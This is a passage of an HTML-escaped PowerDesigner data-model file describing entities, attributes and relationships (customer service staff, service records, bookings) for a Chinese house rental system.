Id=&quot;o59&quot;&gt;&lt;a:ObjectID&gt;D9D28149-7D20-4BCC-920E-5B8F49373C8E&lt;/a:ObjectID&gt;&lt;a:Name&gt;预定流水号&lt;/a:Name&gt;&lt;a:Code&gt;预定流水号&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618325545&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618327225&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:History&gt;ORG &#123;C41A4BC7-929F-4BB9-BFDA-78B0883BC246&#125;,&#123;D4FD4412-8743-4AEA-B773-42465813A721&#125;DAT 1618325546ATT CODEATT NAMEATT DTTP&lt;/a:History&gt;&lt;a:DataType&gt;VA20&lt;/a:DataType&gt;&lt;a:Length&gt;20&lt;/a:Length&gt;&lt;a:LogicalAttribute.Mandatory&gt;1&lt;/a:LogicalAttribute.Mandatory&gt;&lt;a:AutoMigrated&gt;1&lt;/a:AutoMigrated&gt;&lt;/o:EntityAttribute&gt;&lt;o:EntityAttribute Id=&quot;o60&quot;&gt;&lt;a:ObjectID&gt;32574FCE-7D54-4D3D-AA98-C83909852F7A&lt;/a:ObjectID&gt;&lt;a:Name&gt;身份证&lt;/a:Name&gt;&lt;a:Code&gt;IDNum&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618325545&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618327225&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:History&gt;ORG &#123;4AFE59F8-46B5-4D94-9E36-D1C0C6A93550&#125;,&#123;D4FD4412-8743-4AEA-B773-42465813A721&#125;DAT 1618325546ATT PIDTF&lt;/a:History&gt;&lt;a:DataType&gt;VA18&lt;/a:DataType&gt;&lt;a:Length&gt;18&lt;/a:Length&gt;&lt;a:LogicalAttribute.Mandatory&gt;1&lt;/a:LogicalAttribute.Mandatory&gt;&lt;a:AutoMigrated&gt;1&lt;/a:AutoMigrated&gt;&lt;/o:EntityAttribute&gt;&lt;o:EntityAttribute Id=&quot;o61&quot;&gt;&lt;a:ObjectID&gt;CA11FFF8-714B-4053-A468-D09353A7E3FA&lt;/a:ObjectID&gt;&lt;a:Name&gt;房屋编号&lt;/a:Name&gt;&lt;a:Code&gt;房屋编号&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618327152&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618327225&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:DataType&gt;A20&lt;/a:DataType&gt;&lt;a:Length&gt;20&lt;/a:Length&gt;&lt;a:LogicalAttribute.Mandatory&gt;1&lt;/a:LogicalAttribute.Mandatory&gt;&lt;/o:EntityAttribute&gt;&lt;o:EntityAttribute Id=&quot;o62&quot;&gt;&lt;a:ObjectID&gt;5394A779-DCBE-4DA7-8C19-0CD992008F23&lt;/a:ObjectID&gt;&lt;a:Name&gt;预定时间&lt;/a:Name&gt;&lt;a:Code&gt;预定时间&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618327253&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618327266&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:DataType&gt;D&lt;/a:DataType&gt;&lt;a:LogicalAttribute.Mandatory&gt;1&lt;/a:LogicalAttribute.Mandatory&gt;&lt;/o:EntityAttribute&gt;&lt;/c:Attributes&gt;&lt;/o:Entity&gt;&lt;o:Entity Id=&quot;o34&quot;&gt;&lt;a:ObjectID&gt;3EE96128-127C-4EF1-8004-2C6243B2E0F9&lt;/a:ObjectID&gt;&lt;a:Name&gt;客服&lt;/a:Name&gt;&lt;a:Code&gt;客服&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618328383&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618332271&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;c:Identifiers&gt;&lt;o:Identifier Id=&quot;o63&quot;&gt;&lt;a:ObjectID&gt;682DB99C-0B47-43E4-A316-7DA8787C2AB4&lt;/a:ObjectID&gt;&lt;a:Name&gt;Identifier_1&lt;/a:Name&gt;&lt;a:Code&gt;Identifier_1&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618331876&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618331886&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;c:Identifier.Attributes&gt;&lt;o:EntityAttribute Ref=&quot;o64&quot;/&gt;&lt;/c:Identifier.Attributes&gt;&lt;/o:Identifier&gt;&lt;/c:Identifiers&gt;&lt;c:PrimaryIdentifier&gt;&lt;o:Identifier Ref=&quot;o63&quot;/&gt;&lt;/c:PrimaryIdentifier&gt;&lt;c:Attributes&gt;&lt;o:EntityAttribute Id=&quot;o64&quot;&gt;&lt;a:ObjectID&gt;36EF7BBC-F289-430C-B44B-C0A936C3C0B4&lt;/a:ObjectID&gt;&lt;a:Name&gt;客服编号&lt;/a:Name&gt;&lt;a:Code&gt;客服编号&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618330925&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618332335&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:DataType&gt;NO&lt;/a:DataType&gt;&lt;a:LogicalAttribute.Mandatory&gt;1&lt;/a:LogicalAttribute.Mandatory&gt;&lt;/o:EntityAttribute&gt;&lt;o:EntityAttribute Id=&quot;o65&quot;&gt;&lt;a:ObjectID&gt;4FB37813-890D-428A-A331-CA6909168468&lt;/a:ObjectID&gt;&lt;a:Name&gt;客服电话&lt;/a:Name&gt;&lt;a:Code&gt;客服电话&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618330925&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618332335&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:DataType&gt;VA11&lt;/a:DataType&gt;&lt;a:Length&gt;11&lt;/a:Length&gt;&lt;a:LogicalAttribute.Mandatory&gt;1&lt;/a:LogicalAttribute.Mandatory&gt;&lt;/o:EntityAttribute&gt;&lt;o:EntityAttribute Id=&quot;o66&quot;&gt;&lt;a:ObjectID&gt;3FB39DC8-1826-4F69-8EC3-6C720DBCDC69&lt;/a:ObjectID&gt;&lt;a:Name&gt;客服姓名&lt;/a:Name&gt;&lt;a:Code&gt;客服姓名&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618330925&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618332335&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:DataType&gt;VA11&lt;/a:DataType&gt;&lt;a:Length&gt;11&lt;/a:Length&gt;&lt;a:LogicalAttribute.Mandatory&gt;1&lt;/a:LogicalAttribute.Mandatory&gt;&lt;/o:EntityAttribute&gt;&lt;o:EntityAttribute Id=&quot;o67&quot;&gt;&lt;a:ObjectID&gt;ABA4FE36-695B-4D60-ABD1-8E35E6CC6522&lt;/a:ObjectID&gt;&lt;a:Name&gt;客服身份证号码&lt;/a:Name&gt;&lt;a:Code&gt;客服身份证号码&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618330925&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618332335&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:DataType&gt;A18&lt;/a:DataType&gt;&lt;a:Length&gt;18&lt;/a:Length&gt;&lt;a:LogicalAttribute.Mandatory&gt;1&lt;/a:LogicalAttribute.Mandatory&gt;&lt;/o:EntityAttribute&gt;&lt;o:EntityAttribute Id=&quot;o68&quot;&gt;&lt;a:ObjectID&gt;EF8BE3C3-F5A9-4709-A79A-AB835A8CEA89&lt;/a:ObjectID&gt;&lt;a:Name&gt;客服评分&lt;/a:Name&gt;&lt;a:Code&gt;客服评分&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618330925&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618332335&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:DataType&gt;I&lt;/a:DataType&gt;&lt;a:LogicalAttribute.Mandatory&gt;1&lt;/a:LogicalAttribute.Mandatory&gt;&lt;/o:EntityAttribute&gt;&lt;/c:Attributes&gt;&lt;/o:Entity&gt;&lt;o:Entity Id=&quot;o35&quot;&gt;&lt;a:ObjectID&gt;A02981F1-E99C-4853-82A4-68F80C60BE5C&lt;/a:ObjectID&gt;&lt;a:Name&gt;服务记录&lt;/a:Name&gt;&lt;a:Code&gt;服务记录&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618331857&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618332271&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;c:Identifiers&gt;&lt;o:Identifier Id=&quot;o69&quot;&gt;&lt;a:ObjectID&gt;4E0E15F7-DE20-4A32-9E88-937D02B93191&lt;/a:ObjectID&gt;&lt;a:Name&gt;Identifier_1&lt;/a:Name&gt;&lt;a:Code&gt;Identifier_1&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618331857&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618332356&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;c:Identifier.Attributes&gt;&lt;o:EntityAttribute Ref=&quot;o70&quot;/&gt;&lt;/c:Identifier.Attributes&gt;&lt;/o:Identifier&gt;&lt;/c:Identifiers&gt;&lt;c:PrimaryIdentifier&gt;&lt;o:Identifier Ref=&quot;o69&quot;/&gt;&lt;/c:PrimaryIdentifier&gt;&lt;c:Attributes&gt;&lt;o:EntityAttribute Id=&quot;o70&quot;&gt;&lt;a:ObjectID&gt;B8101468-78DB-436E-9CC8-5F21E6DFE632&lt;/a:ObjectID&gt;&lt;a:Name&gt;服务记录号&lt;/a:Name&gt;&lt;a:Code&gt;服务记录号&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618331929&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618332356&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:DataType&gt;NO&lt;/a:DataType&gt;&lt;a:LogicalAttribute.Mandatory&gt;1&lt;/a:LogicalAttribute.Mandatory&gt;&lt;/o:EntityAttribute&gt;&lt;o:EntityAttribute Id=&quot;o71&quot;&gt;&lt;a:ObjectID&gt;15F83878-45E1-4A8C-9EA5-CBCD3C985D9E&lt;/a:ObjectID&gt;&lt;a:Name&gt;客服编号&lt;/a:Name&gt;&lt;a:Code&gt;客服编号&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618331876&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618332811&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:DataType&gt;I&lt;/a:DataType&gt;&lt;a:LogicalAttribute.Mandatory&gt;1&lt;/a:LogicalAttribute.Mandatory&gt;&lt;a:AutoMigrated&gt;1&lt;/a:AutoMigrated&gt;&lt;/o:EntityAttribute&gt;&lt;o:EntityAttribute Id=&quot;o72&quot;&gt;&lt;a:ObjectID&gt;7C58CD07-13DC-4822-A16C-E7B816E13B1C&lt;/a:ObjectID&gt;&lt;a:Name&gt;身份证&lt;/a:Name&gt;&lt;a:Code&gt;IDNum&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618331857&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618332356&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:DataType&gt;VA18&lt;/a:DataType&gt;&lt;a:Length&gt;18&lt;/a:Length&gt;&lt;a:LogicalAttribute.Mandatory&gt;1&lt;/a:LogicalAttribute.Mandatory&gt;&lt;a:AutoMigrated&gt;1&lt;/a:AutoMigrated&gt;&lt;/o:EntityAttribute&gt;&lt;/c:Attributes&gt;&lt;/o:Entity&gt;&lt;/c:Entities&gt;&lt;c:Relationships&gt;&lt;o:Relationship Id=&quot;o9&quot;&gt;&lt;a:ObjectID&gt;BC44AF96-72CB-45FF-BC4A-8E230753DEDA&lt;/a:ObjectID&gt;&lt;a:Name&gt;租用1&lt;/a:Name&gt;&lt;a:Code&gt;租用1&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618325545&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618325545&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:History&gt;ORG &#123;40788EEB-C543-4C66-8BC9-4C0CE4D0A1B2&#125;DAT 1618325546&lt;/a:History&gt;&lt;a:Entity1ToEntity2RoleCardinality&gt;1,1&lt;/a:Entity1ToEntity2RoleCardinality&gt;&lt;a:Entity2ToEntity1RoleCardinality&gt;0,n&lt;/a:Entity2ToEntity1RoleCardinality&gt;&lt;c:Object1&gt;&lt;o:Entity Ref=&quot;o21&quot;/&gt;&lt;/c:Object1&gt;&lt;c:Object2&gt;&lt;o:Entity Ref=&quot;o24&quot;/&gt;&lt;/c:Object2&gt;&lt;c:Joins&gt;&lt;o:RelationshipJoin Id=&quot;o73&quot;&gt;&lt;a:ObjectID&gt;80E06EDF-CE87-4EB0-AFAD-03BB529F5714&lt;/a:ObjectID&gt;&lt;a:CreationDate&gt;1618325545&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618325545&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;c:Object1&gt;&lt;o:EntityAttribute Ref=&quot;o37&quot;/&gt;&lt;/c:Object1&gt;&lt;c:Object2&gt;&lt;o:EntityAttribute Ref=&quot;o53&quot;/&gt;&lt;/c:Object2&gt;&lt;/o:RelationshipJoin&gt;&lt;/c:Joins&gt;&lt;c:ParentIdentifier&gt;&lt;o:Identifier Ref=&quot;o36&quot;/&gt;&lt;/c:ParentIdentifier&gt;&lt;/o:Relationship&gt;&lt;o:Relationship Id=&quot;o12&quot;&gt;&lt;a:ObjectID&gt;1F496893-9A00-4C05-A3B2-683210DB4DD3&lt;/a:ObjectID&gt;&lt;a:Name&gt;租用2&lt;/a:Name&gt;&lt;a:Code&gt;租用2&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618325545&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618325545&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:History&gt;ORG &#123;B74ABDAE-7F8E-4DAA-BECE-67686B380E54&#125;DAT 1618325546&lt;/a:History&gt;&lt;a:Entity1ToEntity2RoleCardinality&gt;0,n&lt;/a:Entity1ToEntity2RoleCardinality&gt;&lt;a:Entity2ToEntity1RoleCardinality&gt;1,1&lt;/a:Entity2ToEntity1RoleCardinality&gt;&lt;c:Object1&gt;&lt;o:Entity Ref=&quot;o24&quot;/&gt;&lt;/c:Object1&gt;&lt;c:Object2&gt;&lt;o:Entity Ref=&quot;o22&quot;/&gt;&lt;/c:Object2&gt;&lt;c:Joins&gt;&lt;o:RelationshipJoin Id=&quot;o74&quot;&gt;&lt;a:ObjectID&gt;1D75CD41-4233-4EC7-B565-51AB9EE4EDB0&lt;/a:ObjectID&gt;&lt;a:CreationDate&gt;1618325545&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618325545&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;c:Object1&gt;&lt;o:EntityAttribute Ref=&quot;o41&quot;/&gt;&lt;/c:Object1&gt;&lt;c:Object2&gt;&lt;o:EntityAttribute Ref=&quot;o54&quot;/&gt;&lt;/c:Object2&gt;&lt;/o:RelationshipJoin&gt;&lt;/c:Joins&gt;&lt;c:ParentIdentifier&gt;&lt;o:Identifier Ref=&quot;o40&quot;/&gt;&lt;/c:ParentIdentifier&gt;&lt;/o:Relationship&gt;&lt;o:Relationship Id=&quot;o15&quot;&gt;&lt;a:ObjectID&gt;0017D355-0272-4462-BC40-797D267ABA2E&lt;/a:ObjectID&gt;&lt;a:Name&gt;拥有&lt;/a:Name&gt;&lt;a:Code&gt;拥有&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618325545&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618325545&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:History&gt;ORG &#123;EAB9668A-ADFE-4355-822B-2AAAEBE5E1E1&#125;DAT 1618325546&lt;/a:History&gt;&lt;a:Entity1ToEntity2RoleCardinality&gt;0,n&lt;/a:Entity1ToEntity2RoleCardinality&gt;&lt;a:Entity2ToEntity1RoleCardinality&gt;1,1&lt;/a:Entity2ToEntity1RoleCardinality&gt;&lt;c:Object1&gt;&lt;o:Entity Ref=&quot;o22&quot;/&gt;&lt;/c:Object1&gt;&lt;c:Object2&gt;&lt;o:Entity Ref=&quot;o23&quot;/&gt;&lt;/c:Object2&gt;&lt;c:Joins&gt;&lt;o:RelationshipJoin Id=&quot;o75&quot;&gt;&lt;a:ObjectID&gt;645DE716-F528-4B05-9E29-99369F0BD595&lt;/a:ObjectID&gt;&lt;a:CreationDate&gt;1618325545&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618325545&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;c:Object1&gt;&lt;o:EntityAttribute Ref=&quot;o48&quot;/&gt;&lt;/c:Object1&gt;&lt;c:Object2&gt;&lt;o:EntityAttribute Ref=&quot;o42&quot;/&gt;&lt;/c:Object2&gt;&lt;/o:RelationshipJoin&gt;&lt;/c:Joins&gt;&lt;c:ParentIdentifier&gt;&lt;o:Identifier Ref=&quot;o47&quot;/&gt;&lt;/c:ParentIdentifier&gt;&lt;/o:Relationship&gt;&lt;o:Relationship Id=&quot;o18&quot;&gt;&lt;a:ObjectID&gt;7B0D4B67-1C5D-4546-B012-F8C57E32D803&lt;/a:ObjectID&gt;&lt;a:Name&gt;预定&lt;/a:Name&gt;&lt;a:Code&gt;预定2&lt;/a:Code&gt;&lt;a:CreationDate&gt;0&lt;/a:CreationDate&gt;&lt;a:Creator/&gt;&lt;a:ModificationDate&gt;1618327225&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:History&gt;ORG &#123;D4FD4412-8743-4AEA-B773-42465813A721&#125;DAT 1618325546&lt;/a:History&gt;&lt;a:Entity1ToEntity2RoleCardinality&gt;0,n&lt;/a:Entity1ToEntity2RoleCardinality&gt;&lt;a:Entity2ToEntity1RoleCardinality&gt;1,1&lt;/a:Entity2ToEntity1RoleCardinality&gt;&lt;c:Object1&gt;&lt;o:Entity Ref=&quot;o25&quot;/&gt;&lt;/c:Object1&gt;&lt;c:Object2&gt;&lt;o:Entity Ref=&quot;o21&quot;/&gt;&lt;/c:Object2&gt;&lt;c:Joins&gt;&lt;o:RelationshipJoin Id=&quot;o76&quot;&gt;&lt;a:ObjectID&gt;80C6C77E-2606-4686-8AE7-9422A808A802&lt;/a:ObjectID&gt;&lt;a:CreationDate&gt;1618325545&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618325545&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;c:Object1&gt;&lt;o:EntityAttribute Ref=&quot;o37&quot;/&gt;&lt;/c:Object1&gt;&lt;c:Object2&gt;&lt;o:EntityAttribute Ref=&quot;o60&quot;/&gt;&lt;/c:Object2&gt;&lt;/o:RelationshipJoin&gt;&lt;/c:Joins&gt;&lt;c:ParentIdentifier&gt;&lt;o:Identifier Ref=&quot;o36&quot;/&gt;&lt;/c:ParentIdentifier&gt;&lt;/o:Relationship&gt;&lt;o:Relationship Id=&quot;o20&quot;&gt;&lt;a:ObjectID&gt;D6DA5B71-06A1-4A4F-97C4-7A81725CC0E5&lt;/a:ObjectID&gt;&lt;a:Name&gt;预定&lt;/a:Name&gt;&lt;a:Code&gt;预定&lt;/a:Code&gt;&lt;a:CreationDate&gt;0&lt;/a:CreationDate&gt;&lt;a:Creator/&gt;&lt;a:ModificationDate&gt;0&lt;/a:ModificationDate&gt;&lt;a:Modifier/&gt;&lt;a:History&gt;ORG &#123;D4FD4412-8743-4AEA-B773-42465813A721&#125;DAT 1618325546&lt;/a:History&gt;&lt;a:DependentRole&gt;A&lt;/a:DependentRole&gt;&lt;a:Entity1ToEntity2RoleCardinality&gt;1,1&lt;/a:Entity1ToEntity2RoleCardinality&gt;&lt;a:Entity2ToEntity1RoleCardinality&gt;0,n&lt;/a:Entity2ToEntity1RoleCardinality&gt;&lt;c:Object1&gt;&lt;o:Entity Ref=&quot;o22&quot;/&gt;&lt;/c:Object1&gt;&lt;c:Object2&gt;&lt;o:Entity Ref=&quot;o25&quot;/&gt;&lt;/c:Object2&gt;&lt;c:Joins&gt;&lt;o:RelationshipJoin Id=&quot;o77&quot;&gt;&lt;a:ObjectID&gt;3C7BE695-A5F1-488B-8AA8-351DDA6A431C&lt;/a:ObjectID&gt;&lt;a:CreationDate&gt;1618325545&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618325545&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;c:Object1&gt;&lt;o:EntityAttribute Ref=&quot;o41&quot;/&gt;&lt;/c:Object1&gt;&lt;c:Object2&gt;&lt;o:EntityAttribute Ref=&quot;o59&quot;/&gt;&lt;/c:Object2&gt;&lt;/o:RelationshipJoin&gt;&lt;/c:Joins&gt;&lt;c:ParentIdentifier&gt;&lt;o:Identifier Ref=&quot;o40&quot;/&gt;&lt;/c:ParentIdentifier&gt;&lt;/o:Relationship&gt;&lt;o:Relationship Id=&quot;o30&quot;&gt;&lt;a:ObjectID&gt;454931F7-376E-4BF7-93DB-EE4BCF290BEA&lt;/a:ObjectID&gt;&lt;a:Name&gt;接听&lt;/a:Name&gt;&lt;a:Code&gt;接听&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618331857&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618332356&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:Entity1ToEntity2RoleCardinality&gt;0,n&lt;/a:Entity1ToEntity2RoleCardinality&gt;&lt;a:Entity2ToEntity1RoleCardinality&gt;1,1&lt;/a:Entity2ToEntity1RoleCardinality&gt;&lt;c:Object1&gt;&lt;o:Entity Ref=&quot;o35&quot;/&gt;&lt;/c:Object1&gt;&lt;c:Object2&gt;&lt;o:Entity Ref=&quot;o34&quot;/&gt;&lt;/c:Object2&gt;&lt;c:Joins&gt;&lt;o:RelationshipJoin Id=&quot;o78&quot;&gt;&lt;a:ObjectID&gt;14EB9E04-93D0-4A37-99B4-4D26D18A0179&lt;/a:ObjectID&gt;&lt;a:CreationDate&gt;1618331876&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618331886&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;c:Object1&gt;&lt;o:EntityAttribute Ref=&quot;o64&quot;/&gt;&lt;/c:Object1&gt;&lt;c:Object2&gt;&lt;o:EntityAttribute Ref=&quot;o71&quot;/&gt;&lt;/c:Object2&gt;&lt;/o:RelationshipJoin&gt;&lt;/c:Joins&gt;&lt;c:ParentIdentifier&gt;&lt;o:Identifier Ref=&quot;o63&quot;/&gt;&lt;/c:ParentIdentifier&gt;&lt;/o:Relationship&gt;&lt;o:Relationship Id=&quot;o33&quot;&gt;&lt;a:ObjectID&gt;7F2F2D1E-3184-4F02-AA2D-E0DD2929B1E8&lt;/a:ObjectID&gt;&lt;a:Name&gt;联系&lt;/a:Name&gt;&lt;a:Code&gt;联系&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618331857&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618332356&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:Entity1ToEntity2RoleCardinality&gt;1,1&lt;/a:Entity1ToEntity2RoleCardinality&gt;&lt;a:Entity2ToEntity1RoleCardinality&gt;0,n&lt;/a:Entity2ToEntity1RoleCardinality&gt;&lt;c:Object1&gt;&lt;o:Entity Ref=&quot;o21&quot;/&gt;&lt;/c:Object1&gt;&lt;c:Object2&gt;&lt;o:Entity Ref=&quot;o35&quot;/&gt;&lt;/c:Object2&gt;&lt;c:Joins&gt;&lt;o:RelationshipJoin Id=&quot;o79&quot;&gt;&lt;a:ObjectID&gt;F421BDFA-354B-45A8-A4B9-57027FE597C0&lt;/a:ObjectID&gt;&lt;a:CreationDate&gt;1618331857&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618331857&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;c:Object1&gt;&lt;o:EntityAttribute Ref=&quot;o37&quot;/&gt;&lt;/c:Object1&gt;&lt;c:Object2&gt;&lt;o:EntityAttribute Ref=&quot;o72&quot;/&gt;&lt;/c:Object2&gt;&lt;/o:RelationshipJoin&gt;&lt;/c:Joins&gt;&lt;c:ParentIdentifier&gt;&lt;o:Identifier Ref=&quot;o36&quot;/&gt;&lt;/c:ParentIdentifier&gt;&lt;/o:Relationship&gt;&lt;/c:Relationships&gt;&lt;c:TargetModels&gt;&lt;o:TargetModel Id=&quot;o80&quot;&gt;&lt;a:ObjectID&gt;CAD8447C-1C4E-4C76-94DE-732EF097A68D&lt;/a:ObjectID&gt;&lt;a:Name&gt;房屋租赁系统&lt;/a:Name&gt;&lt;a:Code&gt;房屋租赁系统&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618325546&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618325546&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:TargetModelURL&gt;file:///%_EXAMPLES%/我的项目/房屋租赁系统.cdm&lt;/a:TargetModelURL&gt;&lt;a:TargetModelID&gt;8FDD11B2-37EE-4B1A-B801-2D3A7E259451&lt;/a:TargetModelID&gt;&lt;a:TargetModelClassID&gt;1E597170-9350-11D1-AB3C-0020AF71E433&lt;/a:TargetModelClassID&gt;&lt;a:TargetModelLastModificationDate&gt;1618325546&lt;/a:TargetModelLastModificationDate&gt;&lt;c:SessionShortcuts&gt;&lt;o:Shortcut Ref=&quot;o4&quot;/&gt;&lt;/c:SessionShortcuts&gt;&lt;/o:TargetModel&gt;&lt;o:TargetModel Id=&quot;o81&quot;&gt;&lt;a:ObjectID&gt;C9F013B7-84D9-42B3-A75F-0800EF7C3AB1&lt;/a:ObjectID&gt;&lt;a:Name&gt;房屋租赁系统&lt;/a:Name&gt;&lt;a:Code&gt;房屋租赁系统&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618333034&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618333956&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:TargetModelURL&gt;file:///%_EXAMPLES%/我的项目/房屋租赁系统.pdm&lt;/a:TargetModelURL&gt;&lt;a:TargetModelID&gt;1F49DC66-529B-454F-8F5F-AC9E437B7E95&lt;/a:TargetModelID&gt;&lt;a:TargetModelClassID&gt;CDE44E21-9669-11D1-9914-006097355D9B&lt;/a:TargetModelClassID&gt;&lt;a:TargetModelLastModificationDate&gt;1618333956&lt